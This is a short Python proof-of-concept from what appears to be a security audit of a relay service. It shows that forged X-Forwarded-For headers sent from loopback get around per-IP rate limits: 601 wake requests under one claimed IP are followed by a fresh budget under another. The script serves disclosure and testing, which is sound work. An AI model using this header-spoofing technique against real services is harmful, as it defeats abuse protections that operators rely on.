#!/usr/bin/env python3
"""Finding: on the documented deployment (trusted_proxy = 127.0.0.1, relay
listening on 127.0.0.1), ANY local process -- not just the real reverse
proxy -- can set X-Forwarded-For, because trust is based only on the TCP
peer address and loopback is shared by every local process. A local
attacker (no special privilege beyond reaching the loopback port) picks
its own value and gets a fresh per-IP rate-limit bucket on demand, so the
per-source-IP limits (wake 600/h, register 10/h, confirm 60/h) are not a
limit on an attacker at all: rotate the claimed IP, get a new budget.

Run with TRUSTED_PROXY=127.0.0.1 ./up.sh $W (the README's own example)."""
import rr

def wake(xff, n=1):
    sts = {}
    for _ in range(n):
        body = b'{"v":1,"handle":"AAAAAAAAAAAAAAAAAAAA"}'
        head = ("POST /v1/wake HTTP/1.1\r\nHost: x\r\nContent-Type: application/json\r\n"
                "X-Forwarded-For: %s\r\nContent-Length: %d\r\nConnection: close\r\n\r\n" % (xff, len(body))).encode()
        st, h, b = rr.request("POST", "/v1/wake", raw_head=head, body=body, src="127.0.0.1")
        sts[st] = sts.get(st, 0) + 1
    return sts

print("601 wakes claiming to be 9.9.9.1:", wake("9.9.9.1", 601))
print("1 more, same claimed IP (should be 429, budget spent):", wake("9.9.9.1", 1))
print("1 wake claiming a brand-new IP 9.9.9.2 (same attacker, same real loopback peer):", wake("9.9.9.2", 1))
